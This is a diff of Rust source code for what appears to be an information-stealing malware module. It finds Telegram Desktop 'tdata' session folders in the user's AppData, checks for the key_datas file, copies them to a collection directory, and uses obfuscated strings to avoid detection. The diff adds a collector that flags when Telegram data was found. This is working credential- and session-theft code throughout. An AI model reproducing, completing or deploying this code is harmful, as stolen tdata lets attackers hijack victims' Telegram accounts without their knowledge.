@@ -1,13 +1,14 @@
 use alloc::borrow::ToOwned;
 use alloc::vec;
+use collector::{Collector, Software};
+use obfstr::obfstr as s;
 use tasks::Task;
 use utils::path::Path;
-use obfstr::obfstr as s;
 
 pub(super) struct TelegramTask;
 
-impl Task for TelegramTask {
-    unsafe fn run(&self, parent: &Path) {
+impl<C: Collector> Task<C> for TelegramTask {
+    unsafe fn run(&self, parent: &Path, collector: &C) {
         let appdata = &Path::appdata();
         let paths = [
             (s!("Telegram Desktop").to_owned(), appdata / s!("Telegram Desktop") / s!("tdata")),
@@ -17,13 +18,16 @@ impl Task for TelegramTask {
         for (client, tdata_path) in paths {
             if tdata_path.is_exists() {
                 let dst = parent / client;
-                copy_tdata(&tdata_path, &dst);
+                copy_tdata(&tdata_path, &dst, collector);
             }
         }
     }
 }
 
-fn copy_tdata(tdata: &Path, dst: &Path) {
+fn copy_tdata<C>(tdata: &Path, dst: &Path, collector: &C)
+where
+    C: Collector
+{
     if !(tdata / s!("key_datas")).is_exists() {
         return
     }
@@ -49,6 +53,10 @@ fn copy_tdata(tdata: &Path, dst: &Path) {
                 contents.push(dir);
             }
         }
+    }
+
+    if !contents.is_empty() {
+        collector.get_software().set_telegram();
     }
     
     for path in contents {
